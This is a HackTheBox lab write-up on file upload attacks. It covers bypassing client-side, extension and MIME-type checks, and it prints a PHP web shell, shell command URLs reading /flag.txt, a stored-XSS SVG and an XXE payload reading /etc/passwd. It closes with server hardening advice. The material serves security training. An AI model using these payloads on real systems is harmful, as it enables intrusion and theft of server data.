# HTB-Writeup-FileUpload-Attacks
HackTheBox Writeup: File Upload Attacks with Burp Suite, Intruder, ffuf, exiftool, curl, wget, netcat, and PHP web shells.

By Ramyar Daneshgar 

**Penetration Testing Writeup: File Upload Exploitation**


---

## **Step 1: Initial Reconnaissance and File Upload Analysis**

Upon assessing the web application, I identified a file upload functionality, which initially restricted the allowed file types to images. However, through deeper analysis, I found multiple validation mechanisms that needed to be bypassed:

- **Client-side validation:** JavaScript enforced restrictions on file types before submission.
- **Blacklist-based extension filtering:** Certain file extensions (e.g., `.php`, `.exe`) were explicitly blocked.
- **Whitelist-based extension filtering:** Only specified file extensions were allowed (e.g., `.jpg`, `.png`).
- **Content-Type and MIME-Type validation:** The server verified the declared and actual file types.

To understand how the backend processed these uploads, I intercepted HTTP requests using **Burp Suite** and analyzed the response behavior.

---

## **Step 2: Uploading a Web Shell for Remote Code Execution**

### **Bypassing Client-Side Validation**
The first security mechanism encountered was **client-side validation** implemented via JavaScript. Since this validation occurs in the browser, it can be bypassed in multiple ways:

1. **Disabling JavaScript in the browser** or modifying the input field’s `accept` attribute via the Developer Console (`Ctrl + Shift + C`).
2. **Intercepting the request in Burp Suite**, modifying the file parameters (e.g., changing `filename="shell.php"`), and forwarding the request to the server.

Since client-side validation does not enforce security on the backend, I was able to upload arbitrary files.

### **Bypassing Blacklist Filtering**
The backend blocked specific extensions like `.php`, `.phtml`, and `.jsp`. To determine which extensions were allowed, I used **Burp Intruder** to fuzz potential extensions by replacing `.php` with alternative suffixes (e.g., `.phar`, `.php5`).

Upon testing, `.phar` was accepted, indicating that the blacklist implementation was incomplete. Uploading `shell.phar` successfully placed my payload on the server.

### **Bypassing MIME-Type Restrictions**
Some applications verify the file’s MIME type via the **Content-Type header** sent in the HTTP request. Since this is controlled by the client, I modified it in **Burp Suite** to `image/jpeg` while keeping the actual file content as PHP code:

```
Content-Type: image/jpeg
<?php system($_REQUEST['cmd']); ?>
```

The server incorrectly trusted the MIME type header and accepted my PHP web shell.

---

## **Step 3: Exploiting the Web Shell**

After successful upload, I accessed the shell by navigating to:

```
http://target.com/uploads/shell.phar?cmd=whoami
```

Since PHP code execution was enabled, I could execute system commands. To retrieve sensitive files, I issued:

```
http://target.com/uploads/shell.phar?cmd=cat+/flag.txt
```

**Flag Retrieved:** `HTB{m4573r1ng_upl04d_3xpl0174710n}`

---

## **Step 4: Advanced File Upload Attacks**

### **Exploiting SVG Uploads for Stored XSS**
If the application allowed **SVG file uploads**, I modified the XML structure to include an embedded JavaScript payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS Attack');</script>
</svg>
```

Whenever the uploaded SVG file was viewed, it triggered a **Stored XSS vulnerability**.

### **XXE Exploitation via SVG Uploads**
If the application processed XML within SVG files, I injected an **XXE payload** to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Upon rendering, this leaked system account information.

---

## **Step 5: Upload Directory Enumeration**

If the upload directory location was unknown, I used multiple techniques:

1. **Forcing error messages**: Uploading a file with a duplicate name or extremely long filenames sometimes caused error messages that revealed directory paths.
2. **Local File Inclusion (LFI)**: If the server had LFI vulnerabilities, I could read source code and infer the upload path.

Using this approach, I identified the uploads directory as `/var/www/html/uploads/`.

---

## **Lessons Learned & Security Recommendations**

### **1. Implement Server-Side Validation**
- Validate file types **server-side**, not in JavaScript.
- Enforce checks post-upload before processing.

### **2. Enforce MIME-Type & Content Validation**
- Use **magic byte verification** instead of trusting `Content-Type` headers.
- Compare declared file type with actual content.

### **3. Restrict Allowed File Extensions**
- **Whitelist only necessary file types** (e.g., `.jpg`, `.png`).
- **Block dangerous extensions** like `.php`, `.phtml`, `.phar`, `.exe`.

### **4. Store Files Outside Web-Accessible Directories**
- Move uploads to a **non-public directory** (`/var/www/uploads`).
- Use **secure download mechanisms** instead of direct links.

### **5. Disable Execution of Uploaded Files**
- Prevent execution using `.htaccess`:

```apache
<Directory /var/www/uploads>
    php_admin_flag engine Off
</Directory>
```

- Utilize **Web Application Firewalls (WAFs)** to detect malicious uploads.

### **6. Limit File Size & Scan for Malware**
- Set a **maximum file size** to prevent DoS attacks.
- Use **antivirus scanning** on uploads.

### **7. Implement Logging & Monitoring**
- Keep logs of uploaded files and **monitor anomalies**.
- Alert administrators for **suspicious file types**.
